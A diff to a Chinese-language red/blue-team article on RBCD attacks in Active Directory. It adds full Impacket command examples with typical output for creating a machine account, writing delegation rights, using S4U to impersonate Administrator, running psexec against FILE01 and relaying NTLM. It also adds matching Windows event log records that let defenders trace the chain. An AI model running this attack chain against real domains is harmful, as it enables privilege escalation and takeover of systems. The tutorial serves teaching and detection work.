@@ -232,6 +232,23 @@ Get-ADUser Administrator -Properties AccountNotDelegated,MemberOf
 
 如果你准备用某个非内置管理员做 impersonation，要先确认他没有被标记为“敏感且不能被委派”。
 
+### 2.1.2 请求与响应记录方式
+
+为了让这类文章真正具备复现价值，建议在实战记录里把每一步都拆成两部分：
+
+- 请求：你发起了什么命令、目标是谁、关键参数是什么
+- 响应：工具返回了什么、哪些字段说明成功、哪些字段说明失败
+
+在 `RBCD` 场景下，至少应记录下面几组请求与响应：
+
+1. 新建机器账户
+2. 读取或写入 `msDS-AllowedToActOnBehalfOfOtherIdentity`
+3. 申请 `S4U2Self + S4U2Proxy` 票据
+4. 使用票据访问目标服务
+5. 事后在日志侧对应到哪条 `5136 / 4741 / 4769`
+
+这样既能让红队复现实验，也能让蓝队做攻击链回放。
+
 ### 2.2 第一步：创建攻击者控制的机器账户
 
 Linux 下常用 `Impacket`：
@@ -259,6 +276,39 @@ New-MachineAccount -MachineAccount "RBCD-SVC" `
 
 后续写入属性本质上是把这个机器主体的 SID 写到目标对象的安全描述符里。
 
+#### 请求示例
+
+```bash
+addcomputer.py 'corp.local/lowpriv:Password123!' \
+  -dc-ip 10.10.10.10 \
+  -computer-name 'RBCD-SVC$' \
+  -computer-pass 'Str0ngPass!123'
+```
+
+#### 典型响应示例
+
+```text
+[*] Successfully added machine account RBCD-SVC$ with password Str0ngPass!123.
+```
+
+这条响应最关键的不是整行文本，而是三个信息点：
+
+- 机器账户名 `RBCD-SVC$`
+- 创建动作成功 `Successfully added`
+- 后续要继续使用的密码 `Str0ngPass!123`
+
+如果失败，常见响应会体现为：
+
+- `insufficient access rights`
+- `machine account quota exceeded`
+- `constraint violation`
+
+它们分别通常对应：
+
+- 当前用户不能创建机器账户
+- `MachineAccountQuota=0` 或已用尽
+- 账户名格式、对象状态或目录约束不满足
+
 从取证角度看，这一步往往会在域控上留下 `4741`，并且新机器对象的创建者会成为后续事件链里的关键关联点。因此蓝队排查时不能把新机器账户当作孤立事件看。
 
 如果要进一步确认创建状态，可以直接查：
@@ -275,6 +325,23 @@ ldapsearch -x -H ldap://10.10.10.10 \
   -b 'DC=corp,DC=local' '(sAMAccountName=RBCD-SVC$)' \
   dn objectSid servicePrincipalName
 ```
+
+#### LDAP 查询响应示例
+
+```text
+dn: CN=RBCD-SVC,CN=Computers,DC=corp,DC=local
+objectSid:: AQUAAAAAAAUVAAAA...
+servicePrincipalName: HOST/RBCD-SVC
+servicePrincipalName: HOST/RBCD-SVC.corp.local
+servicePrincipalName: RestrictedKrbHost/RBCD-SVC
+servicePrincipalName: RestrictedKrbHost/RBCD-SVC.corp.local
+```
+
+这组响应说明了三件事：
+
+- 对象真的已经落入目录中
+- 你能拿到其 `SID`
+- 机器账户自带 `SPN`，后续可以走 `S4U2Self`
 
 ### 2.3 第二步：给目标主机配置 RBCD
 
@@ -297,6 +364,36 @@ Set-DomainRBCD -Identity FILE01 -DelegateFrom 'RBCD-SVC$'
 
 写入成功后，`FILE01$` 就被配置为信任 `RBCD-SVC$` 代表其他用户访问自己。
 
+#### 请求示例
+
+```bash
+rbcd.py \
+  -delegate-from 'RBCD-SVC$' \
+  -delegate-to 'FILE01$' \
+  -action write \
+  -dc-ip 10.10.10.10 \
+  'corp.local/lowpriv:Password123!'
+```
+
+#### 典型响应示例
+
+```text
+[*] Delegation rights modified successfully!
+[*] RBCD-SVC$ can now impersonate users on FILE01$ via S4U2Proxy
+```
+
+这里应在记录中单独摘出：
+
+- 谁被加入委派：`RBCD-SVC$`
+- 谁被配置为资源：`FILE01$`
+- 结果是否成功：`Delegation rights modified successfully`
+
+如果这里失败，最有价值的记录不是整页堆栈，而是：
+
+- 你用的账户是谁
+- 目标对象是谁
+- 工具是在“写入 LDAP”阶段失败，还是“解析对象”阶段失败
+
 写入后建议立即二次读取，而不是直接跳票据申请：
 
 ```bash
@@ -308,6 +405,21 @@ rbcd.py \
 ```
 
 因为在真实环境中，最容易出错的地方之一不是 `getST.py`，而是根本没有成功写进目标对象。
+
+#### 读取响应示例
+
+```text
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is set
+[*] Accounts allowed to act on behalf of other identity:
+    RBCD-SVC$
+```
+
+这一步建议在文章或项目记录中保留完整响应截图或文本，因为它可以直接证明：
+
+- 写入操作已经落到目录对象
+- 当前允许代理的主体到底是谁
+
+从蓝队视角看，这类“写后读取确认”的动作也能帮助还原攻击者操作顺序。
 
 ### 2.4 第三步：请求目标用户的服务票据
 
@@ -339,6 +451,46 @@ getST.py \
 
 也就是说，票据申请的 `SPN` 不是随便填的，而应反推你下一步准备怎么横向。
 
+#### 请求示例
+
+```bash
+getST.py \
+  -spn cifs/file01.corp.local \
+  -impersonate Administrator \
+  -dc-ip 10.10.10.10 \
+  'corp.local/RBCD-SVC$:Str0ngPass!123'
+```
+
+#### 典型响应示例
+
+```text
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator.ccache
+```
+
+这组响应中，每一行都对应一段非常关键的“请求 -> 响应”链条：
+
+- `Getting TGT for user`
+  说明工具先为 `RBCD-SVC$` 建立自己的 Kerberos 身份上下文
+- `Requesting S4U2self`
+  说明第一段服务票据申请开始
+- `Requesting S4U2Proxy`
+  说明真正面向目标服务的代理申请开始
+- `Saving ticket in Administrator.ccache`
+  说明最终票据文件已生成，可用于后续访问
+
+如果你想把协议动作也记录下来，可在笔记中额外对应：
+
+- 请求：`TGS-REQ (S4U2Self)`
+- 响应：`TGS-REP`
+- 请求：`TGS-REQ (S4U2Proxy)`
+- 响应：`TGS-REP`
+
+即便不抓原始报文，至少也要在操作日志里写清楚工具级输出。
+
 ### 2.5 第四步：拿着票据打目标主机
 
 ```bash
@@ -346,6 +498,36 @@ export KRB5CCNAME=Administrator.ccache
 
 impacket-psexec -k -no-pass corp.local/administrator@file01.corp.local
 ```
+
+#### 请求示例
+
+```bash
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec -k -no-pass corp.local/administrator@file01.corp.local
+```
+
+#### 典型响应示例
+
+```text
+[*] Requesting shares on file01.corp.local.....
+[*] Found writable share ADMIN$
+[*] Uploading file ...
+[*] Opening SVCManager on file01.corp.local.....
+[*] Creating service ...
+[*] Starting service ...
+```
+
+这一段响应说明票据已经不只是“申请成功”，而是已经被目标服务接受，并转化为后续横向动作：
+
+- 目标主机接受了当前 `Kerberos` 身份
+- `ADMIN$` 可写
+- 远程服务控制成功
+
+如果这里失败，而前面的 `getST.py` 是成功的，则要优先怀疑：
+
+- 请求的 `SPN` 与实际访问方式不匹配
+- 被模拟用户对目标没有本地管理员权限
+- 目标服务虽可认证，但后续执行面被限制
 
 或者：
 
@@ -469,6 +651,36 @@ ntlmrelayx.py -t ldaps://10.10.10.10 \
   --no-dump --no-da --no-acl --no-validate-privs
 ```
 
+#### Relay 请求与响应示例
+
+请求侧：
+
+```bash
+ntlmrelayx.py -t ldaps://10.10.10.10 \
+  -smb2support \
+  --delegate-access \
+  --escalate-user 'BAUD$' \
+  --no-dump --no-da --no-acl --no-validate-privs
+```
+
+典型响应侧：
+
+```text
+[*] HTTPD: Connection from 10.10.10.21 controlled, attacking target ldaps://10.10.10.10
+[*] Authenticating against ldaps://10.10.10.10 as CORP/TARGET$ SUCCEED
+[*] Delegation rights modified successfully!
+[*] BAUD$ can now impersonate users on TARGET$ via S4U2Proxy
+```
+
+这类响应要特别记录四个字段：
+
+- 被中继的来源主机 IP
+- 被中继成功的主体，如 `CORP/TARGET$`
+- 被授予委派能力的账户，如 `BAUD$`
+- 被配置的资源对象，如 `TARGET$`
+
+这几项一旦记录下来，蓝队后续对照 `5136` 和网络日志时会非常容易拼接链路。
+
 需要注意的是，跨域场景下有时不能只给 `--escalate-user` 传名字，而要传 SID。Synacktiv 在 2026 年的跨域 `RBCD` 研究里就专门提到了这一点，因为外域主体不一定能被目标域 LDAP 直接按名称解析。
 
 ### 3.4 为什么蓝队容易漏掉这条链
@@ -583,6 +795,17 @@ Get-WinEvent -LogName Security |
 
 这会让你后续把 `5136` 与 `4741`、`4769` 做关联时精度高很多。
 
+#### 事件记录示例
+
+```text
+Event ID: 5136
+SubjectUserName: lowpriv
+ObjectDN: CN=FILE01,CN=Computers,DC=corp,DC=local
+AttributeLDAPDisplayName: msDS-AllowedToActOnBehalfOfOtherIdentity
+```
+
+如果你在文章中记录案例，建议至少把这四个字段写出来，而不是只写“出现了 5136”。因为真正可用于排查的不是事件号本身，而是谁改了谁、改了什么属性。
+
 ### 5.2 Event ID 4741：新机器账户创建
 
 如果攻击者走的是默认 `MachineAccountQuota` 路线，通常会在域控上留下 `4741`。
@@ -601,6 +824,21 @@ Get-WinEvent -LogName Security |
 - 记下新机器名和创建者
 - 再看这个创建者是否很快修改了某台服务器对象的 `msDS-AllowedToActOnBehalfOfOtherIdentity`
 - 再看该机器账户是否很快出现在 `4769`
+
+#### 事件记录示例
+
+```text
+Event ID: 4741
+SubjectUserName: lowpriv
+TargetUserName: RBCD-SVC$
+ComputerAccountControl: 0x1000
+```
+
+对于这类案例记录，最重要的是：
+
+- 创建者是谁
+- 新对象叫什么
+- 这个新对象是否随后参与了 `S4U`
 
 ### 5.3 Event ID 4769：S4U2Self 与 S4U2Proxy
 
@@ -633,6 +871,31 @@ swolfsec 的公开分析还特别提到了两个字段层特征：
 
 此外，`S4U2Self` 常见 `TicketOptions` 可见 `0x40800018` 这类值。单独拿它做强检测未必稳，但作为调查辅助字段很有价值。
 
+#### S4U2Self 事件示例
+
+```text
+Event ID: 4769
+Account Name: RBCD-SVC$
+Service Name: RBCD-SVC$
+Ticket Options: 0x40800018
+```
+
+#### S4U2Proxy 事件示例
+
+```text
+Event ID: 4769
+Account Name: RBCD-SVC$
+Service Name: cifs/file01.corp.local
+Transited Services: RBCD-SVC$
+```
+
+如果把这两条事件与前面的 `4741`、`5136` 放在一起，整条攻击链就非常清楚：
+
+1. `lowpriv` 创建了 `RBCD-SVC$`
+2. `lowpriv` 修改了 `FILE01$` 的 `msDS-AllowedToActOnBehalfOfOtherIdentity`
+3. `RBCD-SVC$` 发起 `S4U2Self`
+4. `RBCD-SVC$` 又对 `cifs/file01.corp.local` 发起 `S4U2Proxy`
+
 ### 5.4 目标主机侧的二次痕迹
 
 `RBCD` 本身只负责拿票据，不负责最终入侵动作。真正的后续危害往往体现在目标主机上：
@@ -648,6 +911,24 @@ swolfsec 的公开分析还特别提到了两个字段层特征：
 - 是否紧接着出现来自异常源主机的 `Kerberos` 登录
 - 是否有 `SMB`、`PsExec`、`WinRM`、`WMI` 访问行为
 - 是否出现凭据转储、远程服务创建或任务投递
+
+#### 目标主机响应记录示例
+
+```text
+Event ID: 4624
+LogonType: 3
+AuthenticationPackage: Kerberos
+TargetUserName: Administrator
+WorkstationName: ATTACKBOX
+```
+
+```text
+Event ID: 7045
+ServiceName: RemComSvc
+AccountName: LocalSystem
+```
+
+如果你要把“请求与响应案例都记录下来”，这里就不能只写攻击者视角的命令输出，还要把目标主机侧的接受结果一起记进去。否则只能算“请求被发起了”，不能算“请求被目标接受并产生了实际效果”。
 
 ### 5.5 可直接落地的狩猎思路
 
